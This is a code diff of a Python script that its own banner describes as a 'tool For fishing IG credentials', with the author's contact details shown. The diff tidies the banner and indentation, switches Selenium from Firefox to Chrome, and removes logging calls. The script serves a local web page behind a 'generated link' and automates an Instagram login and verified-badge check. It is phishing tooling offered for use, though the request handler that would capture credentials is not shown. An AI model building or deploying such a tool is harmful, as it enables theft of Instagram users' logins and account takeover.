@@ -15,6 +15,7 @@ from selenium.webdriver.support import expected_conditions as EC
 import getpass
 
 
+
 def check_root():
     return os.geteuid() == 0
 
@@ -55,10 +56,10 @@ print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  
 print("\033[92m\n\n")
 print("\033[92m         ***********************************************")
 print("\033[92m         #                                             #")
-print("\033[92m         #   tool For fishing IG credentials #")
-print("\033[92m         #   Follow Me On Github: @ephraim sib#")
-print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
-print("\033[92m         #   Changelog: 5-12-2023           #")
+print("\033[92m         #   tool For fishing IG credentials           #")
+print("\033[92m         #   Follow Me On Github: @ephraim sib         #")
+print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com  #")
+print("\033[92m         #   Changelog: 5-12-2023                      #")
 print("\033[92m         #                                             #")
 print("\033[92m         ***********************************************")
 print("\033[92m\n\n")
@@ -94,55 +95,51 @@ def run_server():
     with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
         print(f"Server is running on port {port}")
 
-        
-# Initialize the Firefox WebDriver
-    driver = webdriver.firefox()
+    # Initialize the Chrome WebDriver
+    driver = webdriver.Chrome()  # Use Chrome or Firefox: webdriver.Chrome() or webdriver.Firefox()
 
-try:
-    # Open Instagram login page
-    driver.get('https://www.instagram.com/accounts/login/')
+    try:
+        # Open Instagram login page
+        driver.get('https://www.instagram.com/accounts/login/')
 
-    # Get user credentials (replace with actual credentials)
-    username = "your_username"
-    password = "your_password"
+        # Get user credentials (replace with actual credentials)
+        username = "your_username"
+        password = "your_password"
 
-    # Log in
-    username_input = driver.find_element(By.NAME, 'username')
-    password_input = driver.find_element(By.NAME, 'password')
-    login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
+        # Log in
+        username_input = driver.find_element(By.NAME, 'username')
+        password_input = driver.find_element(By.NAME, 'password')
+        login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
 
-    username_input.send_keys(username)
-    password_input.send_keys(password)
-    login_button.click()
+        username_input.send_keys(username)
+        password_input.send_keys(password)
+        login_button.click()
 
-    # Wait for the login to complete
-    WebDriverWait(driver, 10).until(EC.url_to_be('https://www.instagram.com/'))
+        # Wait for the login to complete
+        WebDriverWait(driver, 10).until(EC.url_to_be('https://www.instagram.com/'))
 
-    # Check if the user has a blue badge (verified account)
-    blue_badge_element = driver.find_element(By.CSS_SELECTOR, 'svg[aria-label="Verified"]')
-    blue_badge_status = blue_badge_element.is_displayed()
+        # Check if the user has a blue badge (verified account)
+        blue_badge_element = driver.find_element(By.CSS_SELECTOR, 'svg[aria-label="Verified"]')
+        blue_badge_status = blue_badge_element.is_displayed()
 
-    if blue_badge_status:
-        print("Congratulations! You have a blue badge (verified account) on Instagram.")
-        logging.info("User has a blue badge (verified account) on Instagram.")
-    else:
-        print("You do not have a blue badge on Instagram.")
-        logging.info("User does not have a blue badge on Instagram.")
+        if blue_badge_status:
+            print("Congratulations! You have a blue badge (verified account) on Instagram.")
+        else:
+            print("You do not have a blue badge on Instagram.")
 
-except Exception as e:
-    print(f"An error occurred: {e}")
-    logging.error(f"Error during login: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
-finally:
-    # Close the browser
-    driver.quit()
+    finally:
+        # Close the browser
+        driver.quit()
 
-    # Generate the link
-    link = f"http://localhost:{port}/"
-    print(f"Generated link: {link}")
+        # Generate the link
+        link = f"http://localhost:{port}/"
+        print(f"Generated link: {link}")
 
-    # Serve forever
-    httpd.serve_forever()
+        # Serve forever
+        httpd.serve_forever()
 
 if __name__ == "__main__":
     run_server()
